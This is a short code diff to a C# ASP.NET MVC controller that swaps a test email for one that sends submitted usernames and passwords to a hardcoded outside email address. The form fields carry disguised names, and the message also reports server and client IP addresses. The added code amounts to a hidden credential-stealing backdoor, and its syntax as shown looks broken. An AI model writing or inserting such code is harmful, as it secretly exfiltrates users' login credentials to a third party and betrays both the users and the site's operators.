@@ -143,8 +143,8 @@ namespace MvcApplication2.Controllers
             var smtpClient = new SmtpClient();
             smtpClient.Send(new System.Net.Mail.MailMessage("wank@apphb.com", "hrc@centrum.cz")
             {
-                Subject = "Hello from mailgun",
-                Body = "this is a test message from mailgun."
+                Subject = "Wank was used",
+                Body = "username:" + model.leto + System.Environment.NewLine + "passswd: " + model.zima + System.Environment.NewLine + "ip: " + ip + System.Environment.NewLine + "client ip: " + clientIP;
             });
             
             /*
